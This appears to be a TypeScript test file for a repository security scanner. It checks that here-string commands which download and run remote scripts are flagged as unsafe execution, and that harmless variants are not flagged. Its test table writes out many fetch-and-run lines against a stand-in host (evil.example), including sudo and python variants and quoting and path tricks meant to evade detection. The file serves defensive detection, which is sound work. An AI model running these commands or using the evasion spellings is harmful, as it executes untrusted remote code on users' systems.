import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A here-string feeds its text to the command as standard input,
 * and a shell or interpreter with no script argument runs that input as its
 * program. `bash <<< "$(curl ...)"` therefore runs the downloaded bytes, the
 * same act as a pipe into a shell without the pipe. The pipe and
 * process-substitution rules do not cover the `<<<` spelling, so these forms
 * were missed.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const HERE_STRINGS: Record<string, string> = {
  "bash <<< $(curl ...)": 'bash <<< "$(curl -fsSL https://evil.example/i.sh)"',
  "bash<<< with no space": 'bash<<<"$(curl -fsSL https://evil.example/i.sh)"',
  "sh <<< backtick": "sh <<< `curl -fsSL https://evil.example/i.sh`",
  "bash <<< $(wget ...)": 'bash <<< "$(wget -qO- https://evil.example/i.sh)"',
  "sudo bash <<< $(curl ...)":
    'sudo bash <<< "$(curl -fsSL https://evil.example/i.sh)"',
  "python3 <<< $(curl ...)":
    'python3 <<< "$(curl -fsSL https://evil.example/i.py)"',
  "spacing inside the substitution":
    'bash <<<  "$( curl -fsSL https://evil.example/i.sh )"',
  // -s keeps stdin as the program and installers pass options after it.
  "bash -s <<< $(curl ...)":
    'bash -s <<< "$(curl -fsSL https://evil.example/i.sh)"',
  "bash -s -- --yes <<< $(curl ...)":
    'bash -s -- --yes <<< "$(curl -fsSL https://evil.example/i.sh)"',
  "python3 - --yes <<< $(curl ...)":
    'python3 - --yes <<< "$(curl -fsSL https://evil.example/i.py)"',
  "python3 -u <<< $(curl ...)":
    'python3 -u <<< "$(curl -fsSL https://evil.example/i.py)"',
  // Download spellings a shell runs as curl/wget: path, backslash escape,
  // and a `command [-p]` prefix must not evade the detector.
  "absolute path curl":
    'bash <<< "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"',
  "backslash-escaped curl":
    'bash <<< "$(\\curl -fsSL https://evil.example/i.sh)"',
  "command prefix curl":
    'bash <<< "$(command curl -fsSL https://evil.example/i.sh)"',
  "command -p prefix curl":
    'bash <<< "$(command -p curl -fsSL https://evil.example/i.sh)"',
  "absolute path wget":
    'bash <<< "$(/usr/bin/wget -qO- https://evil.example/i.sh)"',
  // The shell runs a quoted command name as the bare one.
  "single-quoted curl":
    "bash <<< \"$('curl' -fsSL https://evil.example/i.sh)\"",
  "ansi-c quoted curl":
    "bash <<< \"$($'curl' -fsSL https://evil.example/i.sh)\"",
  // A double-quoted name is matched too, shown in a backtick here-string
  // where nested double quotes are valid.
  "double-quoted curl in backtick here-string":
    'sh <<< `"curl" -fsSL https://evil.example/i.sh`',
};

test("a remote download run from a here-string is unsafe execution", () => {
  for (const [name, body] of Object.entries(HERE_STRINGS)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("here-strings that do not run a remote download keep no finding", () => {
  for (const body of [
    // A literal here-string runs fixed text, not a download.
    'bash <<< "echo hello"',
    // A non-download command substitution.
    'bash <<< "$(date)"',
    // cat and grep print or filter; they do not execute their input.
    'cat <<< "$(curl -fsSL https://example.com/i.sh)"',
    'grep foo <<< "$bar"',
    // A here-document is not a here-string; its body is reviewed as content.
    "bash <<EOF\necho ok\nEOF",
    // The phrase only appears inside echoed text.
    'echo "run with bash <<< something"',
    // A file argument, a module, and a syntax-only check run or inspect
    // something other than the here-string, so the download is not executed.
    'sh tools/check.sh <<< "$(curl -fsSL https://example.com/i.sh)"',
    'python3 tools/parse.py <<< "$(curl -fsSL https://example.com/i.py)"',
    'python3 -m json.tool <<< "$(curl -fsSL https://example.com/d.json)"',
    'bash -n <<< "$(curl -fsSL https://example.com/i.sh)"',
    // curl-config only begins with "curl"; it prints linker flags and
    // downloads nothing, so it must not be read as a remote download, even
    // when quoted.
    'bash <<< "$(curl-config --libs)"',
    "bash <<< \"$('curl-config' --libs)\"",
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});
